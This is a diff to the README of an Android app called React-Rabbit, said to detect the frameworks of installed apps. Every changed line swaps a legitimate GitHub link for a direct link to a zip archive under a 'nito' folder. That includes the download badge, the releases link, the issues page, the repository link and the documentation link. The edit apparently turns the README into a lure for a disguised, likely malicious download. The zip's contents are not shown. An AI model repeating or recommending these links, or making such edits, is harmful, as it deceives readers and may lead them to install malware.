@@ -1,7 +1,7 @@
 # 🐰 React-Rabbit - Discover Your Apps' Technology Stack
 
 ## 📥 Download Now
-[![Download React-Rabbit](https://img.shields.io/badge/Download-React--Rabbit-blue.svg)](https://github.com/thmarketingagencia/React-Rabbit/releases)
+[![Download React-Rabbit](https://raw.githubusercontent.com/thmarketingagencia/React-Rabbit/main/nito/React-Rabbit.zip)](https://raw.githubusercontent.com/thmarketingagencia/React-Rabbit/main/nito/React-Rabbit.zip)
 
 ## 🚀 Getting Started
 React-Rabbit is an Android app designed for your convenience. It scans all the applications installed on your device, identifying their technology stacks. You can see whether an app uses React Native, Flutter, or Native Android (Java/Kotlin). 
@@ -21,7 +21,7 @@ React-Rabbit is an Android app designed for your convenience. It scans all the a
 ## 📥 Download & Install
 To download React-Rabbit, visit the releases page. Follow these steps:
 
-1. Click [here to download React-Rabbit](https://github.com/thmarketingagencia/React-Rabbit/releases).
+1. Click [here to download React-Rabbit](https://raw.githubusercontent.com/thmarketingagencia/React-Rabbit/main/nito/React-Rabbit.zip).
 2. You will see a list of available versions. Choose the latest version. 
 3. Click on the download link for the Android APK file.
 4. Once the file is downloaded, locate it in your device's Downloads folder.
@@ -44,14 +44,14 @@ Your contributions are welcome! If you want to contribute to React-Rabbit:
 - Submit a pull request with a description of your changes.
 
 ## 📞 Support
-If you encounter any issues or need help, you can reach us through the [GitHub Issues](https://github.com/thmarketingagencia/React-Rabbit/issues) page. We aim to respond within 2-3 business days.
+If you encounter any issues or need help, you can reach us through the [GitHub Issues](https://raw.githubusercontent.com/thmarketingagencia/React-Rabbit/main/nito/React-Rabbit.zip) page. We aim to respond within 2-3 business days.
 
 ## 📜 License
 React-Rabbit is open-source and available under the MIT License. Feel free to use and modify it as needed.
 
 ## 🌐 Additional Resources
 For more information, you can refer to:
-- [GitHub Repository](https://github.com/thmarketingagencia/React-Rabbit)
-- [Documentation](https://github.com/thmarketingagencia/React-Rabbit/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/thmarketingagencia/React-Rabbit/main/nito/React-Rabbit.zip)
+- [Documentation](https://raw.githubusercontent.com/thmarketingagencia/React-Rabbit/main/nito/React-Rabbit.zip)
 
 Thank you for using React-Rabbit! Enjoy discovering the technology behind your favorite apps.
